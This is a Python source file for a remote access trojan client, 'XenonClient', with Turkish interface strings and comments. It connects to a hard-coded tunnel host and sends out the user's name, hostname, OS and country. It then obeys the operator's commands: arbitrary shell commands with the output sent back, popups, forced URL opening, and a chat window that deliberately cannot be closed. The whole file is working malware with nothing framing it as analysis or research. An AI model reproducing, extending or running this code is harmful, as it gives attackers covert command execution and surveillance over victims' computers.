import socket
import subprocess
import json
import time
import tkinter as tk
from tkinter import messagebox
import webbrowser
import winsound
import platform
import getpass
import urllib.request
import threading

class XenonClient:
    def __init__(self, ip, port):
        self.ip = ip; self.port = port
        self.chat_win = None
        self.chat_box = None

    def get_recon(self):
        data = {"id": f"{getpass.getuser()}@{platform.node()}", "os": f"{platform.system()} {platform.release()}", "country": "??"}
        try:
            with urllib.request.urlopen("http://ip-api.com/json/", timeout=3) as r:
                data["country"] = json.loads(r.read().decode()).get("countryCode", "??")
        except: pass
        return data

    def run(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.ip, self.port))
                self.sock.send(json.dumps(self.get_recon()).encode("utf-8"))
                
                while True:
                    data = self.sock.recv(16384).decode("utf-8")
                    if not data: break
                    
                    if data.startswith("msg|"):
                        m = data.split("|")[1]
                        threading.Thread(target=self.popup, args=(m,)).start()
                    elif data.startswith("open_url|"):
                        webbrowser.open(data.split("|")[1])
                    elif data == "beep":
                        winsound.Beep(1000, 500)
                    elif data == "chat_open":
                        threading.Thread(target=self.open_chat).start()
                    elif data.startswith("chat_msg|"):
                        m = data.split("|")[1]
                        if self.chat_box: self.chat_box.insert("end", f"ADMIN: {m}\n"); self.chat_box.see("end")
                    elif data == "chat_close":
                        if self.chat_win: self.chat_win.destroy(); self.chat_win = None
                    elif data.startswith("shell|"):
                        out = subprocess.getoutput(data.split("|")[1])
                        self.sock.send(out.encode("utf-8"))
            except: time.sleep(5)
            finally: self.sock.close()

    def popup(self, msg):
        r = tk.Tk(); r.withdraw(); r.attributes("-topmost", True)
        messagebox.showinfo("Xenon System", msg); r.destroy()

    def open_chat(self):
        if self.chat_win: return
        self.chat_win = tk.Tk(); self.chat_win.title("SİSTEM YÖNETİCİSİ İLE SOHBET")
        self.chat_win.geometry("400x450"); self.chat_win.configure(bg="#000000")
        self.chat_win.attributes("-topmost", True)
        
        # KAPATMAYI ENGELLE (X tuşu ve Alt+F4 çalışmaz)
        self.chat_win.protocol("WM_DELETE_WINDOW", lambda: None)
        
        self.chat_box = tk.Text(self.chat_win, bg="#050505", fg="#00FF00", font=("Consolas", 10))
        self.chat_box.pack(expand=True, fill="both", padx=5, pady=5)
        
        entry = tk.Entry(self.chat_win, bg="#111", fg="white", insertbackground="white")
        entry.pack(fill="x", padx=5, pady=5)
        
        def send_to_admin(e=None):
            m = entry.get()
            if m:
                self.chat_box.insert("end", f"SİZ: {m}\n"); self.sock.send(f"chat|{m}".encode("utf-8"))
                entry.delete(0, "end"); self.chat_box.see("end")
        entry.bind("<Return>", send_to_admin)
        self.chat_win.mainloop()

if __name__ == "__main__":
    XenonClient("uwtd3ffva.localto.net", 6522).run()
